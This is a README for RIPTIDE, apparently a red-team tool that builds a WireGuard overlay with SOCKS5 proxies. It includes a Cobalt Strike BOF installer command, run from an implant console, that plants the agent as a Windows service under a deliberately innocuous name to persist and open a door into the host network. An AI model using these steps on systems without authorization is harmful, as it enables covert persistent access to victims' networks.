# RIPTIDE

Star-topology WireGuard overlay for red-team **ops** (SSH, operator WSS, backup door). Peers talk to the hub. They do not mesh with each other.

Authorized lab / red-team use only. Owned systems or written permission.

```
[windows] [kali] [phone]
     \      |      /
      \     |     /
           HUB
        10.66.0.1
        UDP 51820
        SOCKS :1080 on each peer overlay addr
```

## Crypto

The tunnel **is** WireGuard. Homemade ciphers stay out of this repo.

| layer | algorithm |
|---|---|
| handshake | Noise_IK |
| DH | X25519 (RFC 7748 clamp, same as `wg genkey`) |
| transport | ChaCha20-Poly1305 |
| extra | unique PSK per hub↔peer pair |
| unauthenticated packets | silent (no reply) |
| operator state | `mesh.json` sealed with scrypt + XSalsa20-Poly1305, 32-byte `mesh.key` mode 0600 |

Without `mesh.key` the state file is ciphertext. Lose the key, the roster is gone. Rotate a peer with `mesh.py revoke` then enroll again — its PSK dies with it.

Stock WireGuard on the wire so a phone app and `wg-quick` still load the same conf. No vendor control plane.

## Layout

```
mesh.py                 init / peer / revoke / status / pack / gui
lib/keys.py             X25519 + PSK
lib/state.py            sealed mesh.json
lib/crypto.py           at-rest box
lib/render.py           hub/peer confs, units, UFW
agent/                  userspace WG-go + gVisor netstack + SOCKS5 :1080
gui/                    loopback operator UI (127.0.0.1:7667)
bof/                    riptide-install — CopyFile + CreateService (not persist itself)
persist/                systemd unit + optional Windows sc wrapper
templates/              skeletons (no live keys)
```

## CLI

```bash
python3 mesh.py selftest
python3 mesh.py init --name ops --endpoint YOUR.HUB.IP --out ./riptide-out
python3 mesh.py peer --out ./riptide-out --name windows --os windows
python3 mesh.py peer --out ./riptide-out --name kali --os linux
python3 mesh.py peer --out ./riptide-out --name phone --os android
python3 mesh.py status --out ./riptide-out
python3 mesh.py gui --out ./riptide-out          # http://127.0.0.1:7667
```

`riptide-out/mesh.key` and `riptide-out/mesh.json` never go in git. Backup the key separately.

GUI binds loopback only. Cards: overlay IP, persist/session badge, copy `ssh` / `mstsc` / socks. Exit/Tor list is a disabled placeholder.

## Agent

Userspace. No WinTUN, no TAP.

```bash
make agent          # linux
make agent-win      # windows amd64
./agent/riptide-agent --config riptide-out/hub/wg0.conf     # hub
./agent/riptide-agent --config riptide-out/peers/kali.conf  # peer
```

SOCKS5 listens on the overlay address `:1080` (reachable as `10.66.0.X:1080` from other overlay nodes). CONNECT uses the host stack — a door into that machine's network. There is no WAN bind on 4444.

Windows SCM: the same EXE as a service (`--config` next to it). Delayed auto-start, restart on failure, `NT AUTHORITY\NetworkService`.

## BOF installer

`riptide-install` is the installer. After `StartService` it returns. Upload the EXE + conf first (or copy them onto the host); the BOF does not fetch from the network.

```
make bof
# in the implant console
riptide-install C:\Users\Public\riptide-agent.exe C:\Users\Public\peer.conf IntelPma
```

Destination: `%ProgramFiles%\Riptide\`. Pick a boring service name.

Two modes, pick one per host:

- **session** — run the agent from the implant process / a child. Reboot drops the overlay.
- **persist** — BOF + SCM. Overlay comes back after reboot. File on disk is the cost of that.

## Hub firewall (later)

WAN: `80/tcp`, `443/tcp`, `51820/udp`. SSH `:22` and operator WSS `:40056` only `in on wg0`. Template `templates/ufw-mesh.sh` refuses to run unless `CONFIRM=YES`. It does not `ufw --force enable`.

Do not run `install-hub.sh` against a production VPS until you mean to.

## License

MIT © 2026 DonMorpheus. `bof/beacon.h` is the public Cobalt Strike BOF API header.
